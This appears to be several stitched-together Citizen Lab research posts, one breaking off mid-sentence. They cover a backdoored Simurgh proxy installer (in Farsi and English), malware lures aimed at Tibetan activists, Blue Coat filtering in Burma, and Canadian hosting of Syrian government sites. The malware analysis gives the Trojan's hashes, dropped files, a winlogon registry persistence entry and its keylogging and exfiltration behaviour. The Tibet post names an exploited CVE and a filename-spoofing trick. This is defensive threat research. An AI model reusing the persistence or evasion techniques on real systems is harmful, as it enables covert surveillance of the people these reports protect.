که به نظر می رسد زیر مجموعه هایی از فایل چهارم\n<<lsass.exe>>\n<<VB6>> هستند. این فایل یک کد بومی\n است و به عنوان یک بستر نصب می شود که اجازه دسترسی مداوم به کامپیوتر قربانی را می دهد و قابلیت خروج اطلاعات را فراهم می کند.\nدر بخشی از مراحل نصب، ثبت ورود زیر نوشته شده است که از ورود مهاجم اطمینان حاصل می کند.\nHKLM\\software\\microsoft\\windows nt\\currentversion\\winlogon\\shell explorer.exe C:\\WINDOWS\\system32\\drivers\\lsass.exe REG_SZ 0\nدر مرحله ابتدایی٬ فایل\n<<lsass.exe>>\n فایل موجود در این آدرس را پاک می کند.\n‘C:\\WINDOWS\\Media\\Windows XP Start.wav’\nاین یک فایل هدایت کننده صدا در اکسپلورر٬ اینترنت اکسپلورر و بقیه اپلیکیشن هایی با مبنای کنترل مشترک، هست. ازآنجایی که\n<<lsass.exe>>\n از تعدادی از این دست کنترل ها استفاده می کند،احتمالا، هدفش حذف صدای کلیک کردن در طول مدت نصب بستر ویروسی است.  هرچند این عمل به بسته شدن هدایت کننده های صدا در دیگر اپلیکیشن ها (که تنظیم صدا در آنها ضروری است) هم می انجامد.\n \nبه علاوه اطمینان حاصل کردن از تداوم دسترسی\nlsass.exe\n تک تک جزییات بنیادی سیستم از قبیل آدرس ای پی٬ نام میزبان٬ کلمه عبور کاربر را می شمارد  وقابلیت کی‌ لاگر را ارایه می کند. این فایل دوتایی دارای سه فایل  جاوااسکریپت هست که به صورت فایل متنی نوشته شده اند.\nC:\\WINDOWS\\system32\\win.txt\nC:\\WINDOWS\\system32\\1.txt\nC:\\WINDOWS\\system32\\2.txt\n \nاین فایلها به صورت یک ساختار اولیه اچ تی ام ال عمل می کنند تا در سیستم قربانی داده ها را استخراج کنند.\nدر مراحل عمل فایل\n<<win.txt>>\n به\n<<upl.htm>>\n تغییر نام داده می شود و بعد از طریق درخواست اچ تی تی پی به سایت از راه دور کنترل شده ای ارسال می شود که آی اس پی اش در عربستان سعودی ثبت شده است.\nاگر متوجه شدید که این فایل مهاجم بر روی کامپیوتر شما نصب شده، در نظر بگیرید که احتمال این وجود دارد که کلیه حسابهای اینترنتی شما اعم از ایمیل، بانک و غیره به خطر افتاده باشند. توصیه می شود که پسورد/کلمه عبورتان را در اسرع وقت تغییر دهید. با وجودی که این مهاجم از سوی بیشتر نرم افزارهای ضد ویروس مضر تشخیص داده می شود٬ ولی نرم افزارهای ضد ویروس همیشه نمی توانند سیستم آلوده را صد در صد تمیز کنند به همین دلیل نصب دوباره توصیه می شود.\nاین مهاجم طوری طراحی شده است تا افرادی که تلاش می کنند از سانسور دولت بگریزند را هدف قرار دهد.\nبا توجه به هدف اصلی این نرم افزار، کاربران می بایست (در صورتیکه کامپیوترشان مورد حمله قرار گرفت) بسیار محتاط باشند آنها همچنین باید در زمینه نصب هر نوع نرم افزاری احتیاط کنند. بخصوص نرم افزارهای مشکوک با مراجع غیرقابل اعتماد.در صورت امکان، نرم افزارها باید از وب سایت های رسمی و از طریق اچ تی تی پی اس دانلود شود. اگر امضای پنهانی یا «چکسامها»  توسط فروشنده نرم افزار ارایه شده بود، می بایست پیش از نصب کردن چک شود.\nبه روز شده: ۳۰ می ۲۰۱۲\nپس از منتشر شدن گزارش ما، تیم سیمرغ چند گام مهم برای هشدار به کاربران خود در این زمینه ورداشته است:\n۱. تیم سیمرغ به طور مستقیم در وبسایت رسمی این نرم افزار https://simurghesabz.net به زبان های فارسی، عربی و انگلیسی به کاربران خود در مورد نسخه های مخرب سیمرغ هشدار داده است. سیمرغ به همچنین MD5 checksums باینری رسمی و بسته های مخرب، و همچنین دستورالعمل نحوه بررسی MD5 checksums در برابر نرم افزار دانلود شده را نیز در وبسایت خود منتشر کردند. اگر از سیمرغ استفاده کردید یا می کنید، فورا MD5 checksums خود را با آنچه در وبسایت رسمی سیمرغ منتشر شده مقایسه کنید. آنها را دراین زیره نیز میتوانید پیدا کنید:\nاگر نرم افزار شما نسخه رسمی باشد نتایج باید اینگونه باشد\nsimurgh120.20100910.exe-07855ead46bb15718ee73d513bdb9678\nsimurgh120beta.20100326.exe-ddecf8ac6c96c148cc7c42183d25baa9\nو اگر نسخه شما نسخه مضر باشد نتایج اینگونه خواهد بود\nSimurgh-setup.zip : 5e2a714fdfc2309af843056e8c5ae7d3\nSimurgh-setup.exe : 379480c807812f3521466f7ff5ffa273\nSimurgh-setup.exe : 300b0d061dfb9c9c6d7bdeecc74169f1\nsimurgh[homs-sin.ibda3.org].exe : c8c8817af66312cfcfcb1ddf952f9d98\n۲. همانطور که “Sophos “در بلاگ پست اخیرش Naked Security اشاره کرده، صفحه تایید اتصال امن/آی پی که بعد از وصل موفق به سرورهای سیمرغ بازمیشود، پیکربندی شده تا به کاربرانی که قربانی نسخه مخرب شدند هشدار دهد. عکس زیر نمونه ای از این هشدار است.\n\nاگر بعد از اجرای سیمرغ با این هشدار روبرو شدید، فورا این برنامه را ببندید و برای از بین بردن این برنامه مخرب از آنتی ویروس استفاده کنید. ولی برای اطمینان بیشتر، بهتر است که سیستم عامل خود را مجددن نصب کنید.\nعلاوه بر گام هایی که سیمرغ برای هشدار به کاربران خود ورداشته، ما با میزبان نسخه مخرب سیمرغ تماس حاصل کردیم و آنها نیز این نسخه را ور داشته اند تا دیگر قابل دسترسی نباشد\nThank you to ASL19 for translation edits.\n\n\t\t\t\t\n\t\t\t",

(Last updated: May 30)\nClick here to read the post in Farsi.\nClick here to read media coverage on this post.\nSimurgh is an Iranian stand-alone proxy software for Microsoft Windows. It has been used mainly by Iranian users to bypass censorship since 2009. The downloadable file is less than 1 MB and can be downloaded within a reasonable amount of time even with a slow internet connection, which makes it convenient for many users in Iran. Simurgh runs without prior installation or administrator privileges on the computer and therefore, can be copied and used from a USB flash drive on any shared computer (i.e Internet cafes).\nSimurgh is available for free download from its official website https://simurghesabz.net. After running the executable file, a user interface (see below) opens. When the user clicks “Start”, Simurgh will attempt to establish a secure connection. The web browser will then open a new window to provide users with a test page, confirming their secure connection originating from a different country.\n\nIt has recently come to our attention that this software is being recommended and circulated among Syrian Internet users for bypassing censorship in their country. This information led to the discovery and analysis of a back-doored version of this software.\nThe malicious copy will install the Simurgh software, but will also install an undesirable backdoor on the victim’s computer. This software is distributed as “Simurgh-setup.zip” and is identifiable via the following md5 and sha256 hashes:\n5e2a714fdfc2309af843056e8c5ae7d3 Simurgh-setup.zip\n9c1a238d87e3bad41708c2e98f753442a224ed9df994e1a34083b2bf336047e5 Simurgh-setup.zip\nWhen you unzip this file you are presented with Simurgh-setup.exe\n379480c807812f3521466f7ff5ffa273 Simurgh-setup.exe\ne20438a4cf90b67dab613451cc5b3bc35256413461dafdfc35425429d8d478df Simurgh-setup.exe\nThe installer from the most recent legitimate version of Simurgh looks like this:\n\nExecuting the malicious version starts an installation dialogue which looks like this:\n\nIn addition to creating a copy of Simurgh in:\nC:\\Program Files\\Simurgh\\Simurgh.exe\nThe malicious GUI installer drops 4 binaries in C:\\windows\\system32\\drivers:\nMSINET.OCX – 73da54b69911bdd08ea8bbbd508f815ef7cfa59c4684d75c1c602252ec88ee31\nrichtx32.ocx – 318cc48cbcfaba9592956e4298886823cc5f37626c770d6dadbcd224849680c5\nshdocvw.dll – fdae6764d190bf265dbc2df352174ccdcc97b1680545e348f1ee1111b0808693\nlsass.exe – 9320d247dd94f610f31037df8eda75fe79991f126d2e55d35a9532d09ff79896\nThe first three files are legitimate Microsoft system files which appear to be dependencies of the fourth, ‘lsass.exe’. This file is VB6 native code and is installed as an implant to allow persistent access to the victim’s computer and to provide data exfiltration capabilities.\nAs part of the installation the following registry entry is written which ensures the running of the Trojan on logon:\nHKLM\\software\\microsoft\\windows nt\\currentversion\\winlogon\\shell explorer.exe C:\\WINDOWS\\system32\\drivers\\lsass.exe REG_SZ 0\nOn startup, ‘lsass.exe’ deletes ‘C:\\WINDOWS\\Media\\Windows XP Start.wav’. This file is the ‘navigation’ sound in Explorer, IE, and other applications based on a common set of controls. Since ‘lsass.exe’ uses several of these controls, this is presumably done to prevent ‘clicking’ sounds during the operation of the implant. However, this will also lead to a lack of navigation sounds in other applications, where they would be expected.\nIn addition to ensuring persistence, ‘lsass.exe’ enumerates basic details of the system (IP address, hostname, victim username) and provides keylogging functionality. This binary contains three javascript files which are written out as the text files:\nC:\\WINDOWS\\system32\\win.txt\nC:\\WINDOWS\\system32\\1.txt\nC:\\WINDOWS\\system32\\2.txt\nThese act as basic HTML templates for data mined from the victim’s system (such as keystrokes). Processing of ‘win.txt’ renames it to ‘upl.htm’ which is then sent via HTTP post request to a remote site registered with a Saudi Arabian ISP.\nIf this Trojan is found to be installed on a computer one must consider all online accounts (E-mail, banking, etc.) to have been compromised and it is advised that all online passwords be changed as soon as possible. While this Trojan is detected by most anti-virus software as malicious, AV software cannot always be guaranteed to clean up an infected system and a full re-install is suggested.\nThis Trojan has been specifically crafted to target people attempting to evade government censorship. Given the intended purpose of this software, users must be very careful if they have been infected by this Trojan. Additionally, they should be cautious about installing software, especially circumvention software, from untrusted sources. Where possible, software should be downloaded from trusted official websites over HTTPS. If checksums or cryptographic signatures are provided by the software vendor, these should be checked prior to installation.\n\nUPDATED: May 30, 2012\nSince our report was published, the Simurgh team has taken several important steps to warn their users about this threat.\n\n\n\nThe Simurgh team warns their users directly on the website https://simurghesabz.net/with a prominent message in Arabic, Farsi and English about the malicious versions of the software.  They post MD5 checksums of the official binaries and malicious packages, as well as instructions for how to check MD5 checksums against downloaded software.  If you use Simurgh you should immediately compare your installer against the checksums posted on the official site.\n\n\n\nYou can also find these checksums below:\nOfficial binaries\n– simurgh120.20100910.exe – 07855ead46bb15718ee73d513bdb9678\n– simurgh120beta.20100326.exe – ddecf8ac6c96c148cc7c42183d25baa9\nMalicious installer packages\n– Simurgh-setup.zip – 5e2a714fdfc2309af843056e8c5ae7d3\n– Simurgh-setup.exe – 379480c807812f3521466f7ff5ffa273\n– Simurgh-setup.exe – 300b0d061dfb9c9c6d7bdeecc74169f1\n– simurgh[homs-sin.ibda3.org].exe – c8c8817af66312cfcfcb1ddf952f9d98\n\n\nAs Sophos has pointed out in a recent blog post on Naked Security http://nakedsecurity.sophos.com/2012/05/29/spying-trojan-targets-iranian-web-surfers-dissidents/, the splash page that loads when Simurgh is initialized to show the users’ IP has been configured to warn users who may be compromised.  If you see a warning you should immediately run an antivirus program to remove the software or for greater assurance, reinstall your operating system.\n\n\nIn addition to the steps Simurgh has taken, we have made outreach to and notified the provider that was hosting the malicious version of Simurgh and they have now taken down the malicious package.\n\n\nMedia coverage\n\nToronto Star\nSlashdot\nBBC News\nDer Spiegel\nThe Register\nCNET\nSophos’s Naked Security blog\nCSO Australia\nComputerworld\nInfosecurity Magazine\nThe Hosting News\neSecurity Planet\nPing!

    "text": "\n\t\t\t\tDownload PDF version\nThis post is the first in a series of analyses that the Citizen Lab is preparing regarding the urgent and ongoing threat presented by information operations deployed against Tibetans and others who advocate for Tibetan rights and freedoms, including in Tibetan areas of China. The Citizen Lab is concerned with the apparent increase in the use of social engineering linked to the issue of self-immolation to target Tibetan activists with malware, as well as the reported increase in magnitude of information controls (in close coordination with more physical measures) utilized by the Chinese government in Tibetan areas.\nParticularly in light of the upcoming March 10 anniversary of Tibetan Uprising Day, Citizen Lab urges all human rights organizations or others concerned with Tibetan rights to exercise vigilance concerning their use of information and communication technologies at this sensitive time, especially with respect to emails that reference self-immolation or anniversary-related activities.\nBackground\nIn the 2011-2012 period, two significant factors have increased the stakes surrounding the issue of rights and freedoms of Tibetans. Those factors are the rise in the practice by Tibetans of self-immolation as a form of protest against government policies; and the rapidly approaching leadership transition that will take place at the 18th Party Congress of the Communist Party of China (CPC) in Fall 2012. The practice of self-immolation — a controversial manifestation of Tibetan opposition to Chinese government policies — has seriously undermined the assertions of the government that Tibetans benefit from and favor the policies of the CPC, drawing international attention to the issue. At the same time, the leadership transition has further incentivized the government to maintain stability at all costs and stamp out any perceived threat to CPC legitimacy.\nSince 2009, it is estimated that 26 Tibetans have self-immolated, nearly all of whom died as a result. The first reports of self-immolation by Tibetan populations in China surfaced in February 2009, when a monk in Sichuan province set himself on fire outside of a monastery several days before the 50th anniversary of the Tibetan uprising. This event was followed by the March 2011 self-immolation of a second monk in Sichuan province on the third anniversary of protests at the Kirti monastery. By February 2012, the self-immolations expanded to include laypersons, when three herders in Seda county, Sichuan province, became the first non-clergy to commit the act. The self-immolations of the first female laypersons took place in early March 2012 with the deaths of a 19 year old student and a young widow in Ngaba county, Sichuan province.\nThe Chinese government’s tone in its official response to the events has developed as the practice has became more widespread. Government response has ranged from outright denial to accusations the protests are led by organized crime and are a form of terrorism. Chinese Premier Wen Jiabao criticized the protesters as radicals attempting to undermine stability in the Tibet Autonomous Region. A spokesperson for China’s top political advisory board most recently suggested that the Dalai Lama has incited the practice as an act of separatism and encouraged Tibetans to commit suicide, a claim contradicted by the Dalai Lama’s previous statements. In sum, rather than confronting root issues of concern to Tibetans, government representatives have instead framed the incidents as the acts of criminals and the result of a plot by the Dalai Lama.\nIn this context, information operations1 play a key role in the control or compromise of individuals voicing concern for Tibetan rights. Some of these operations are launched by and clearly attributable to the Chinese government. Others, such as targeted cyber attacks, involve more ambiguous attribution.\nGovernment Information Operations\nThe Chinese authorities have taken a multifaceted approach to controlling the discontent, which includes not only an increase in the presence of military and law enforcement personnel in sensitive regions, but also media campaigns to discredit protesters and an information blackout that has cut off Internet access and mobile phone networks.2 In response to the protests, Chinese authorities have reportedly flooded affected towns with paramilitary forces and riot police, establishing roadblocks as a means of restricting access to outside observers. Tibetan Buddhist pilgrims returning from a religious gathering in India were detained and interrogated, while government officials in Tibet have been threatened with disciplinary action should the protests continue.\nIn tandem with these physical measures, the government has taken overt steps to limit the electronic flow of information in the region as well. Since January 2012, Internet and mobile blackouts have been reported in predominantly Tibetan regions of China. Early reports from Sichuan province indicated that the towns of Serthar and Luhuo, sites of conflict in late January between Chinese security forces and protesters, had their telephone and Internet service severed. Reports citing the Global Times, a state-run newspaper, claimed that Internet connections and mobile phone networks were cut for 50km surrounding the protest areas. The Global Times cited a local party official who confirmed that Internet access had been disrupted but denied that the self-immolations had occurred. Other reports have indicated that text messaging and Internet access were disrupted in Sichuan province and the Tibet Autonomous Region. Following a self-immolation on March 5, it was reported that the mobile phones of observers were confiscated to prevent news of the incident from spreading. Other reports have suggested that a number of Tibetan language blog sites hosted in China went offline in early February without explanation.\nMeanwhile, Chinese authorities have continued a media campaign to discredit the protesters. State-owned media outlets have linked the protests to organized crime and blamed external forces and separatists for the conflict.\nTargeted Cyber Attacks\nIn addition to official government information controls, the Citizen Lab is highly concerned with the murky and more difficult-to-attribute targeted malware attacks launched against Tibetan rights advocates. Recent reports from the Tibetan community indicate that numerous malicious emails around the theme of self-immolation have been circulating among Tibetan organizations and activists. Human rights groups are often targeted by malware attacks that leverage issues and events of concern to particular communities to entice users in those communities to open malicious documents or click on links. The Citizen Lab has been tracking these kinds of attacks for some time (see Nobel Peace Prize, Amnesty HK and Malware; Human Rights and Malware Attacks; Targeted Malware Attack on Foreign Correspondents Based in China; “0day”: Civil Society and Cyber Security).\nIn analyzing the recent spate of malicious emails referencing self-immolation, the Citizen Lab has found that the attackers use a variety of social engineering tricks and malware delivery mechanisms often observed in targeted attacks. The Citizen Lab presents a basic overview of its findings here, and will continue to release new and more detailed findings as it continues its research.\nSocial engineering techniques encountered in this analysis include:\n\nIn several cases the attackers have re-purposed existing material from Tibetan activist groups, incorporating such material into the content of the malicious emails and attachments. For example, one malicious email contained a copy of a real post published by Students for a Free Tibet regarding participation in March 10 demonstrations, but with the addition of links to malicious Word and Excel documents.\nOther emails contained text from various news articles related to self-immolation, often taken from articles published the very same day the email was sent.\nThe emails occasionally included benign images, for example of monks at a candlelight vigil, to entice the recipient to open the attachments.\nThe malware was not always delivered through an attachment. Other tactics used by the senders were the inclusion of a link to a malicious document on a web server; and inclusion of links that appear to reference legitimate news sources, but in which the underlying link actually routes to a web page that exploits a Java vulnerability in order to infect the recipient’s machine (a so-called “drive-by download”).\n\nFindings concerning the technical features of the malware analyzed in this analysis include:\n\nThe most common vulnerability exploited in the samples the Citizen Lab has seen is CVE-2010-3333, in which an RTF document is given the file extension .doc so it opens in Microsoft Word and drops a malicious payload.\nWhen a malicious file is opened, it will typically drop a decoy file that is shown to the user while the payload executes in the background.\nAttackers have also made use of the Unicode right-to-left override technique to make an executable file appear to be a document in Windows Explorer.\nAttachments often come inside an archive (.zip or .rar file) to avoid detection by automated virus scans.\n\nAdditionally, it is important to note that Mac users are not immune to these threats. At least one attachment we have seen specifically targets Mac OS X, and the drive-by download checks which operating system the user is running and attempts to execute malware specific to the user’s platform.\nThe Citizen Lab will continue its investigation of information operations and Tibetan rights, and will post further analysis as it becomes available at citizenlab.org.\n\n\nRecommendations for Defending Against Targeted Cyber Threats\nSteps individuals can take to reduce risk of exposure to malware include the following:\n\nBe vigilant concerning all e-mails, web links, and files, especially during sensitive times such as political anniversaries. In particular, carefully assess the authenticity of any such materials referencing sensitive subject matter, such as self-immolations or anniversary-related activities, or containing misspellings or unusual diction.\nCarefully examine the sender’s email address. If the address uses an email account name that appears official, but originates from a common webmail provider (e.g. Gmail), or incorporates minor variations from or unexpected characters than a typical address, consider it a spoofing attempt. Do not access any material included in that email without independently verifying that the actual person in question sent the email (do not reply to the same email address from which the email originates — use telephone calls or research the official email address).\nNever open unexpected or unsolicited attachments. If the attachment is not essential to your work or represents information you can obtain elsewhere (such as through an online search for a particular report or issue), immediately delete it. If you are using Gmail, you can click “View” to view some attachments in your web browser instead of downloading the file to your computer. All file types may contain malware, but be especially wary of .exe, .scr, .zip, and .rar files. If it is essential that you open the file, try to independently confirm with the actual person who appears to have sent it that the file is legitimate. Additionally, running the file through https:/www.virustotal.com/ may help identify files containing malware (though it will not catch zero-day exploits). To perform such a scan, drag or copy the file to your desktop without opening it, and then upload to the virustotal website. The website will provide a summary of results of the scan.\nNever click on unverified links. As with attachments, if the link is not essential to your work or represents information you can obtain elsewhere (such as through an online search), immediately delete it. Keep in mind that hyperlinks that appear to lead to legitimate sites, may in fact mask an underlying malicious web link. In most email programs, if you hover over a hyperlink without clicking, it will show you the actual link as a tooltip (text that briefly appears next to the mouse cursor), or, in the case of webmail, in the status bar of your browser. Suspicious links might have an IP address instead of a domain (e.g. http://10.0.3.10/something.html instead of http://example.com/something.html) or the URL may not match the website to which you expect it to link. If the text of the link in the email does not match the underlying link, there is a good chance the linked page is malicious.\nKeep your computer’s operating system, applications and anti-virus program up to date and ensure you have the latest security updates and patches.\nBe aware of mobile malware. More and more malware released nowadays is designed for mobile phones. Do not download apps that you don’t need, as many apps available in open markets contain malware. There are also projects developing applications to help mobile users protect their communications and personal data from intrusion and monitoring.\n\nIf you are part of a human rights organization and are interested in participating in the Citizen Lab’s ongoing study of targeted cyber threats, please contact us at hrthreats[AT]citizenlab.org.\n\n\n \n\n1While the term “information operations” is often associated with military action, use of the term here is meant to refer to all aspects of information-related capabilities deployed against targeted entities or individuals, and is not limited to operations linked to the military. Such operations may include computer network exploitation/attacks, sabotage, surveillance, espionage, or psychological operations incorporating new media and technology to influence public sentiment and shape the communications space.\n2This is not the first time the severing of Internet access has been used as a form of information control during civil unrest in China. In 2008, following unrest that broke out in Tibet after protests marking the anniversary of the 1959 Tibetan Uprising, Chinese authorities restricted media coverage of the incidents and limited the spread of related Internet content. It has been reported that these information controls included the blocking of content related to the event, the confiscation of mobile phones and the shutdown of cellular networks. Additionally, in 2009, following riots between Uyghur and Han populations in Urumqi, Chinese authorities shut down Internet service in the Xinjiang Uyghur Autonomous Region. The government asserted that the riots had been organized through the Internet and text messaging, and the blackout was not lifted until May 2010.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF version\nBackground\nCitizen Lab research into the use of commercial filtering products in countries under the rule of authoritarian regimes has previously documented the use of devices manufactured by U.S.-based Blue Coat Systems in Syria and Burma. In Behind Blue Coat: Investigations of commercial filtering in Syria and Burma, we identified Blue Coat devices in Burma through the error messages, hostnames and filtering behaviour on Burmese Internet service provider (ISP) Yatanarpon Teleport.\nSince the publication of Behind Blue Coat, it has been reported that the U.S. Commerce Department has launched an investigation to determine if the company had prior knowledge that its equipment was being used by the Syrian government.1 This action was launched following a call from three U.S. Senators for an investigation into Blue Coat and NetApp, another U.S. company whose equipment has been implicated in surveillance activities by the Syrian government.2\nAdditional evidence gathered by the Citizen Lab from Burma since the publication of that report has provided further confirmation that Blue Coat’s devices are presently in use in the country. A message displayed to users by Yatanarpon Teleport references Blue Coat in the URL and is consistent with how Blue Coat devices display notification messages to users. Combined with the evidence presented in Behind Blue Coat, these new findings present a strong case that Blue Coat’s devices are actively in use in Burma.\nFindings\nIn mid-October 2011, users of the Burmese ISP Yatanarpon Teleport were automatically directed to a service-related message in their web browser.3 The message, displayed both in English and Burmese, stated the following:\n“Dear Valued Customers,\nOn 17 October 2011, Due to the failure of SEA-ME-WE 3 submarine fibre optic cable, the Internet connection was unstable. It is being fixed by concerned personnel during this period, the Internet connection may be significantly slow and possibly offline sometimes. We will keep you informed accordingly and sincerely apologize for any inconvenience caused.”\nWith regards,\nYatanarporn Teleport”\nA partial screenshot of this error message can be seen in Figure 1:\n\nFigure 1: Partial screenshot of message to Yatanarpon users\nThe full text of the Burmese error message can be seen in Figure 2:\n\nFigure 2: Screenshot of Burmese error message to Yatanarpon users\nUsers were required to click “Accept” in order to continue browsing, as seen in Figure 1. The disruption of this undersea cable and the ensuing Internet connectivity disruption in Burma has been documented by others.4\nThe content of this error message provides further confirmation that Blue Coat devices are actively in use on Yatanarpon Teleport. Figure 3 shows an enlarged version of the error message from Figure 2:\n\nFigure 3: An enlarged version of the address bar shown in Figure X [Burmese] above\nAs can be seen in Figure 3, the URL displayed by the browser begins with “http://notify.bluecoat.com/”, providing further evidence that Yatanarpon Teleport is using Blue Coat technology.\nThis URL does not, however, indicate that this content is hosted on Blue Coat’s servers. Blue Coat identifies the notify.bluecoat.com domain as a “default ‘virtual hostname’ for user notification pages produced by security appliances from Blue Coat Systems, Inc.”5 The format of this URL is also consistent with Blue Coat documentation referring to the display of user notification pages by ProxySG devices.6 Thus, although the URL suggests that the page is being hosted on Blue Coat’s servers, it is likely being generated by their devices located in Burma.\nAnecdotal reports of Blue Coat messages on Burmese ISPs from users date back to at least 2009, including discussion board threads7 and information relayed to the Citizen Lab from colleagues in the field. Similar user notification messages appearing to originate from “http://notify.bluecoat.com” can be seen in Figures 4 and 5:\n\nFigure 4: Additional user notification message referencing a Blue Coat URL\n\nFigure 5: Additional user notification message referencing a Blue Coat URL\nTranslations of these messages indicate that they are also network status messages notifying users of a connectivity disruption caused by issues with an undersea cable.\nDiscussion\nThe use of censorship and surveillance technology in countries under the rule of authoritarian regimes raises a number of concerns. Companies who find that their products are being used for the purposes of censorship in countries like Syria or Burma, regardless of how those products may have arrived there, are faced with a number of technical, legal and ethical challenges. Our report Behind Blue Coat identified a number of these issues and raised questions about the use of Blue Coat technology in Burma, including:\n\nIs Blue Coat aware of the use of their products and/or services in Burma/Myanmar?\nIf so, has Blue Coat taken any steps to restrict the functionality of those devices?\nIn light of these recent findings, will Blue Coat actively monitor the devices that contact its servers to prevent Blue Coat technology from being used in embargoed countries?\nIf Blue Coat forbids its resellers from selling to embargoed countries, what actions will Blue Coat take with respect to the reseller who brought the 13 devices identified by Blue Coat to Syria?\nDoes Blue Coat have a policy for evaluating the sale of products and services to government, government-controlled or government-affiliated entities that engage in filtering of political content? If so, will Blue Coat share that policy?\n\nCitizen Lab contacted Blue Coat Systems on October 27, 2011, requesting more information regarding the use of their technology in countries against which U.S. trade sanctions are imposed. As of November 29, 2011 we have not received any further information on this issue from the company.\nThe Citizen Lab continues to strongly urge Blue Coat to investigate these findings and to take all necessary steps to limit the functionality of their products in Syria and Burma.\nAcknowledgments: The Citizen Lab would like to thank colleagues who wish to remain anonymous for sharing information collected from Burma.\n—\nFootnotes\n1Horwitz, Sari and Asokan, Shyamantha, “U.S. probing use of surveillance technology in Syria,” Washington Post, November 17, 2011, http://www.washingtonpost.com/world/national-security/us-probes-use-of-surveillance-technology-in-syria/2011/11/17/gIQAS1iEVN_story.html\n2Elgin, Ben and Silver, Vernon, “U.S. calls for NetApp probe on Syria spy tech,” Bloomberg, November 10, 2011, http://www.bloomberg.com/news/2011-11-10/netapp-role-in-syria-spy-project-spurs-demands-for-u-s-inquiry.html\n3Aung, Htoo and Stuart Deed, “Cable fault causes ‘unstable’ net: ISP” The Myanmar Times, November 6, 2011, http://www.mmtimes.com/2011/info/599/\n4See Sai Zom Hseng, “Burma’s Internet, newly opened, slows to a crawl” Irrawaddy, November 3, 2011, http://www.irrawaddy.org/article.php?art_id=22379\n5See http://notify.bluecoat.com/\n6Blue Coat, “Why is the ProxySG not serving the notify user page when I have the default policy set to deny?” January 10, 2011, https://kb.bluecoat.com/index?page=content&id=FAQ1223&actp=RSS\n7See http://www.mysteryzillion.org/discussion/comment/34670#Comment_34669\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload the report [PDF] (354 KB)\nSummary of Main Findings\n– Websites of the Syrian government, including the Ministries of Culture, Transport, and others, are hosted on Canada-based web servers through intermediary companies, one of which, called “Platinum Incorporated,” advertises that it has co-location servers in Canada.\n– The Syrian TV station Addounia TV, which is sanctioned by Canada and the European Union for inciting violence against Syrian citizens, uses Canada-based web servers to host its website.\n– The website for Al-Manar — the official media arm of the Lebanese political party, Hezbullah — is hosted on Canada- and US-based web servers and employs Canada-based web servers to stream its TV broadcast globally. Al-Manar satellite broadcasts have been banned by the US, France, Spain, and Germany as well as the European Union. The United States includes Al-Manar on its Specially Designated Nationals List, a list of entities with which U.S. persons are generally prohibited from dealing, and the assets of which are blocked. Canada currently classifies Hezbullah as a terrorist organization.\n– There are legal questions concerning the provision of web hosting services to each of these organizations. As the Syrian government, Addounia TV, and Hezbullah are all subject to Canadian sanctions, services provided by Canada-based hosting providers to these entities may fall within the scope of the sanctions.\n– Any consideration of the removal of an organization’s website from web hosting services, however, must be treated as a potential infringement on freedom of speech and access to information, with due process and proper accountability mechanisms clearly articulated and followed.\nBackground and Overview\nThere has been increasing attention and concern around the provision of information and communication technologies, products, and services to repressive regimes. For example, recent reports, including several of our own,1 have spotlighted the sale of commercial filtering and surveillance technologies to Internet service providers (ISPs) and / or governments who use those technologies to engage in national-level censorship of political, human rights, cultural, and religious content, and / or surveillance of citizens.2 In November 2011, Citizen Lab and a number of other groups documented the presence of technology produced by California-based Blue Coat Systems to filter Internet content in Syria.3 In our report Behind Blue Coat: Investigations of commercial filtering in Syria and Burma, we also identified Blue Coat devices operating in Burma. The cases of Syria and Burma are especially noteworthy because Blue Coat is a U.S.-based company, and both Syria and Burma are subject to U.S. export restrictions.\nIn the case of Syria, the government is responsible for an ongoing and often brutal crackdown against democratic protesters that has been subject to widespread condemnation. A recent report by Human Rights Watch asserts that the Syrian regime has committed “crimes against humanity” in its violence committed against protesters in the city of Homs.4 The Arab League has condemned the Syrian government for its mistreatment of its citizens, and has suspended Syria from its meetings.5 The United Nations Office of the High Commissioner for Human Rights has estimated that over 3,500 Syrian citizens have been killed since demonstrations began in March 2011.6\nThis report continues Citizen Lab research into the intersection of the private sector, authoritarianism, and cyberspace regulation, turning our attention to a component of the Internet that does not typically receive the same amount of attention as filtering, surveillance, and computer network attack products and services: web hosting services.\nWeb hosting is a central element of Internet communications and commerce. Thousands of companies, large and small, operate servers on which content (including their organization’s web presence) is stored and served to Internet users through a global market place. With the shift to cloud computing and social networking, the politics of web hosting have become more pronounced and complex.\nWeb hosting is an internationalized market. Given the global nature of Internet communications, web hosting can be purchased from nearly any political jurisdiction on the planet. Content that is associated with one region or country might very well be physically situated and served from computers that are based in an entirely different region or country. For that reason, web hosting can be used to circumvent legal and technical restrictions in one jurisdiction by hosting that content in another — in effect using “safe havens” as a basis for strategic web hosting decisions.\nWeb hosting can also be politically controversial. Most of the controversy to date has centered on the conditions under which content is removed from hosting services. There have been numerous cases of content being dropped from web hosting services because of its politically controversial nature, and as a result of pressures being brought to bear on the web hosting providers by lobby groups and special interests without due process. Takedown vigilantism can have as strong an effect as any government regulations when it comes to creating chilling effects around politically controversial speech online.7\nThere are, however, many political jurisdictions in which certain content categories are considered illegal and web hosting services are prohibited from offering their services in these areas. Depending on the country concerned, there can be enormous variation. In China, entire blog-hosting services have been closed because of concerns over the content produced by their uses, and OpenNet Initiative (ONI)8 research has documented other Chinese blogging providers using lists of sensitive keywords to prevent controversial material from being posted.9 In Canada and other liberal democratic countries, on the other hand, restrictions on web hosting are limited primarily to hate speech and content related to the sexual exploitation of children, although even among liberal democratic countries there are variations.10\nWeb hosting is, therefore, categorically different than filtering and surveillance, and involves a different set of considerations when evaluating the market for web hosting services for repressive and authoritarian regimes and with respect to objectionable content in general. Filtering technologies are used to restrict speech and access to information whereas web hosting is designed to facilitate them. Whether and to what extent web hosting should be subject to restrictions of various sorts involves the same sort of reasoning as that applied to speech in general. In liberal democratic countries, infringements on freedom of speech are considered to be highly exceptional and need to be justified in explicit ways that follow due process and clearly specified laws.\nIn the course of Citizen Lab research, we have discovered that a significant number of Syrian government websites are hosted by Canada-based web servers, including the Ministry of Culture, Ministry of Transport, Ministry of Electricity, and Syrian Patent Office. We have also found that the Syrian TV station Addounia TV, which is sanctioned by Canada and the European Union for inciting violence against Syrian citizens, uses Canada-based web servers to host its website addounia.tv.\nOutside of Syria, we found that the website for Al-Manar — the official media arm of the Lebanese political party, Hezbullah — is hosted on Canada- and US-based web servers and employs Canada-based web servers to stream its TV broadcast globally. Al-Manar satellite broadcasts have been banned by the US, France, Spain, and Germany as well as the European Union. The United States includes 